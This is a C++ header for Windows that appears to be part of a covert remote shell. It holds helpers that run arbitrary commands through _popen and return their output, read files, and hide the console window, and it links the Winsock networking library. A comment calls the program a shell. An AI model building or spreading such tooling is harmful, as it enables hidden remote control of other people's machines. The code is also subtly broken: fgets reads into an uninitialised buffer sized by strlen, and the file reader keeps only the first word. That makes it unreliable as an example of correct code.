#pragma once
#define WIN32_LEAN_AND_MEAN

#include <iostream>
#include <vector>
#include <string>
#include <fstream>

#include <Windows.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

//manually allocating and deallocating is such a pain in the as so
//im just gonna use a c++ string
//memory unsafe but i don't see why anyone would buffer overflow a shell
std::string cmd_exec(const char* cmd)
{
	std::cout << "cmdlen: " << strlen(cmd) << std::endl;
	char buffer[128];
	std::string res = "";

	FILE* pipe = _popen(cmd, "r");
	if (!pipe) 
		throw std::exception("_popen() failed");
	
	try
	{
		//compiler gives a warning because of the memory unsafety of strlen()
		while (fgets(buffer, strlen(buffer), pipe) != NULL)
			res += buffer;
	}
	catch (...) {
		_pclose(pipe);
		throw;
	}
	
	_pclose(pipe);
	return res;
}

// custom paths for scalability
std::string read_file(std::string path)
{
	std::ifstream infile(path);
	std::string buffer = "";

	if (infile.is_open())
	{
		infile >> buffer;
		infile.close();
	}
	return buffer;
}

void hide_console()
{
	HWND hide;
	AllocConsole();
	hide = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hide, 0);
}